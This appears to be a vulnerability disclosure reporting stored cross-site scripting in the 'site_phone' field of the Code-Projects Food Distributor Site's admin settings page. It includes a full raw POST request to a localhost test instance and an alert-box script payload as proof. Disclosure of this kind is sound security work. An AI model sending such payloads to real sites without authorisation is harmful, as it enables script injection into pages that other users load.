Cross-Site Scripting vulnerability in the `site_phone` parameter of the Site Settings functionality

```
/fooddis/admin/save_settings.php
```

Vendor Homepage:

```
https://code-projects.org/food-distributor-site-in-php-with-source-code/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP
```

Affected Page:

```
/fooddis/admin/save_settings.php
```

The `site_phone` parameter in the `save_settings.php` file of the Code-Projects Food Distributor System is vulnerable to XSS Injection. 

Proof of vulnerability:

<img width="1156" alt="image" src="https://github.com/user-attachments/assets/1d728608-515f-4441-bdb2-25ff8f823d26" />
Visit the homepage directly
<img width="872" alt="image" src="https://github.com/user-attachments/assets/bf5fc334-01d4-4bfb-a628-aaaacf9dc74e" />




Request:

```
POST /fooddis/admin/save_settings.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 1798
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryreFhNSUjrctCcvq3
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/fooddis/admin/site_settings.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b409c2d300348e8d3c7d564868ff9e2f
Connection: keep-alive

------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_name"

Food Website
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_title"

Food Website
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_keyword"

Site
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_desc"

Food Website, established in 2018, is a well known ethic food distributor in Nigeria. With previous experience in food technology and research, Lumidek Associates Ltd. is the market leader in serving high quality and health promoting food products across Nigeria.
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="google_code"

09tghjpo987hpnjkb
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_email"

info@fooddistributor.com
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="site_phone"

<script>alert('XSS')</script>
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="linkedin"

(+234)000 000 1353
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="facebook"

https://facebook.com
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="twitter"

CP
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="address"

142, Iju waterworks road, Agege, Lagos state.
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="city"

Eliozu road, off Airport road, Port Harcourt, Rivers state
------WebKitFormBoundaryreFhNSUjrctCcvq3
Content-Disposition: form-data; name="country"

Nigeria
------WebKitFormBoundaryreFhNSUjrctCcvq3--
```

payload

```
<script>alert('XSS')</script>
```

